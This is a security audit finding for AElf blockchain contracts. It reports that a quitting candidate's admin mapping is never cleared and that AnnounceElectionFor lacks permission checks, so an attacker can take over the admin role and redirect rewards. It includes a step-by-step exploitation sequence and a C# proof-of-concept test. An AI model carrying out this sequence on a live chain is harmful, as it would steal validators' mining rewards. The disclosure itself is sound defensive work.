# Audit Report

## Title
Admin Hijacking via AnnounceElectionFor Enables ProfitsReceiver Redirect After Candidate Quits

## Summary
A critical vulnerability exists where any attacker can hijack a candidate's admin role after the candidate quits election, allowing the attacker to redirect all future mining rewards and backup subsidies to attacker-controlled addresses. The vulnerability stems from `QuitElection` failing to clear the `CandidateAdmins` mapping while `AnnounceElectionFor` lacks permission checks and unconditionally overwrites this mapping.

## Finding Description

**Root Cause Analysis:**

The `QuitElection` method sets `IsCurrentCandidate = false` and clears various state mappings, but critically fails to clear the `CandidateAdmins` entry. [1](#0-0) 

The `AnnounceElectionFor` method has no permission checks on who can announce election for which pubkey. [2](#0-1)  The method calls the internal `AnnounceElection` helper which only validates that the pubkey is not already a current candidate. [3](#0-2) 

After the validation passes, `AnnounceElectionFor` unconditionally overwrites the admin mapping. [4](#0-3) 

**Exploitation Sequence:**

1. A legitimate candidate quits election, leaving `IsCurrentCandidate = false` but `CandidateAdmins[pubkey]` still populated
2. Attacker calls `AnnounceElectionFor(victim_pubkey, attacker_admin_address)`
3. The `IsCurrentCandidate` check passes because the candidate has quit
4. The admin is overwritten with the attacker's address
5. Attacker calls `SetProfitsReceiver` in the Treasury contract, which authorizes based on `GetCandidateAdmin` [5](#0-4) 
6. The `ProfitsReceiverMap` is updated to the attacker's address [6](#0-5) 

**Recovery Prevention:**

The `SetCandidateAdmin` method requires the caller to be either the Parliament default address or the current admin. [7](#0-6)  Since the attacker is now the current admin, the original candidate cannot recover control.

The original candidate also cannot re-announce because `IsCurrentCandidate` is set back to true after the hijack. [8](#0-7) 

**Reward Redirection Mechanism:**

When basic miner rewards are distributed, the `UpdateBasicMinerRewardWeights` method uses `GetProfitsReceiver(i.Pubkey)` to determine beneficiaries. [9](#0-8)  This method reads directly from the hijacked `ProfitsReceiverMap`. [10](#0-9) 

For backup candidate subsidies, the `AddBeneficiary` method calls `GetBeneficiaryAddress` [11](#0-10)  which retrieves the profits receiver from the Treasury contract. [12](#0-11)  Both reward mechanisms are compromised.

## Impact Explanation

**Direct Financial Loss:**
- All miner rewards for the hijacked pubkey are permanently redirected to the attacker
- All backup candidate subsidies are permanently redirected to the attacker
- If the hijacked candidate later becomes a top miner, this represents substantial ongoing value theft

**Denial of Service:**
- The legitimate candidate permanently loses administrative control over their pubkey
- They cannot set their own profits receiver even with voting support
- Recovery requires complex Parliament governance intervention

**Affected Parties:**
- Any candidate who has quit election is immediately vulnerable
- Former miners who may return to consensus
- Backup candidates who temporarily withdraw

The vulnerability violates the core protocol invariant that profit distribution calculations and dividend settlement accuracy must be maintained, as it allows unauthorized redirection of treasury distributions.

## Likelihood Explanation

**Attacker Requirements:**
- 100,000 tokens to lock for election announcement [13](#0-12) 
- No special privileges or permissions required
- Ability to monitor blockchain for `QuitElection` events

**Attack Complexity:**
- Very low - Only two transactions required: (1) `AnnounceElectionFor`, (2) `SetProfitsReceiver`
- All steps are deterministic with no race conditions
- No timing constraints

**Preconditions:**
- A candidate must have quit election (common during term transitions or maintenance)
- Attack window is unbounded - persists indefinitely after quit

**Economic Incentive:**
- Attack cost: 100,000 tokens (refundable after attacker quits)
- Potential gain: All future mining/subsidy rewards, potentially millions in value
- Risk/reward ratio is extremely favorable

**Detection:**
- Difficult to detect until rewards distribution
- No on-chain alerts for admin changes
- High probability of successful exploitation

## Recommendation

**Immediate Fix:**

Modify the `QuitElection` method to clear the `CandidateAdmins` mapping:

```csharp
public override Empty QuitElection(StringValue input)
{
    // ... existing code ...
    
    // Clear candidate information
    candidateInformation.IsCurrentCandidate = false;
    candidateInformation.AnnouncementTransactionId = Hash.Empty;
    State.CandidateInformationMap[pubkey] = candidateInformation;
    
    // ADD THIS: Clear the admin mapping
    State.CandidateAdmins.Remove(initialPubkey);
    
    // ... rest of existing code ...
}
```

**Additional Hardening:**

Add permission validation to `AnnounceElectionFor` to ensure only authorized parties can announce on behalf of others:

```csharp
public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
{
    var pubkey = input.Pubkey;
    var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
    
    // ADD THIS: Verify the candidate has never announced before
    // or require explicit authorization
    Assert(State.CandidateInformationMap[pubkey] == null, 
        "Cannot re-announce for existing candidate without authorization.");
    
    // ... rest of existing code ...
}
```

## Proof of Concept

```csharp
// Test demonstrating the vulnerability
[Fact]
public async Task AdminHijacking_ViaAnnounceElectionFor_AfterQuit()
{
    // Setup: Legitimate candidate announces and then quits
    var legitimateCandidate = SampleKeyPairs[0];
    var legitAdmin = Accounts[1].Address;
    var attacker = Accounts[2];
    var attackerAdmin = Accounts[3].Address;
    var attackerProfitsReceiver = Accounts[4].Address;
    
    // Step 1: Legitimate candidate announces election
    await ElectionContractStub.AnnounceElection.SendAsync(legitAdmin);
    
    // Verify admin is set correctly
    var adminBefore = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = legitimateCandidate.PublicKey.ToHex() });
    adminBefore.ShouldBe(legitAdmin);
    
    // Step 2: Legitimate candidate quits election
    var quitResult = await ElectionContractStubs[1].QuitElection.SendAsync(
        new StringValue { Value = legitimateCandidate.PublicKey.ToHex() });
    quitResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 3: Attacker hijacks admin via AnnounceElectionFor
    var hijackResult = await AttackerElectionStub.AnnounceElectionFor.SendAsync(
        new AnnounceElectionForInput
        {
            Pubkey = legitimateCandidate.PublicKey.ToHex(),
            Admin = attackerAdmin
        });
    hijackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify admin has been hijacked
    var adminAfter = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = legitimateCandidate.PublicKey.ToHex() });
    adminAfter.ShouldBe(attackerAdmin); // ADMIN IS NOW ATTACKER-CONTROLLED
    
    // Step 4: Attacker redirects profits receiver
    var setProfitsResult = await TreasuryContractStubs[3].SetProfitsReceiver.SendAsync(
        new SetProfitsReceiverInput
        {
            Pubkey = legitimateCandidate.PublicKey.ToHex(),
            ProfitsReceiverAddress = attackerProfitsReceiver
        });
    setProfitsResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify profits receiver has been hijacked
    var profitsReceiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = legitimateCandidate.PublicKey.ToHex() });
    profitsReceiver.ShouldBe(attackerProfitsReceiver); // ALL REWARDS NOW GO TO ATTACKER
    
    // Step 5: Verify original candidate cannot recover
    var recoverAttempt = await ElectionContractStubs[1].SetCandidateAdmin.SendWithExceptionAsync(
        new SetCandidateAdminInput
        {
            Pubkey = legitimateCandidate.PublicKey.ToHex(),
            Admin = legitAdmin
        });
    recoverAttempt.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    recoverAttempt.TransactionResult.Error.ShouldContain("No permission");
}
```

## Notes

This vulnerability represents a critical flaw in the candidate administration lifecycle management. The failure to clear the `CandidateAdmins` mapping combined with the unrestricted `AnnounceElectionFor` method creates an exploitable window for permanent admin hijacking and profit redirection. The issue affects the core economic security of the AElf consensus system, as it allows unauthorized parties to steal mining rewards and subsidies that should flow to legitimate validators.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L27-40)
```csharp
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-128)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L156-157)
```csharp
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L159-159)
```csharp
            candidateInformation.IsCurrentCandidate = true;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L252-254)
```csharp
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L608-609)
```csharp
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L620-620)
```csharp
        State.ProfitsReceiverMap[input.Pubkey] = input.ProfitsReceiverAddress;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L816-816)
```csharp
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L783-783)
```csharp
        var beneficiaryAddress = GetBeneficiaryAddress(candidatePubkey, profitsReceiver);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L809-816)
```csharp
    private Address GetBeneficiaryAddress(string candidatePubkey, Address profitsReceiver = null)
    {
        profitsReceiver = profitsReceiver == null ? GetProfitsReceiverOrDefault(candidatePubkey) : profitsReceiver;
        var beneficiaryAddress = profitsReceiver.Value.Any()
            ? profitsReceiver
            : Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(candidatePubkey));
        return beneficiaryAddress;
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContractConstants.cs (L5-5)
```csharp
    public const long LockTokenForElection = 100_000_00000000;
```
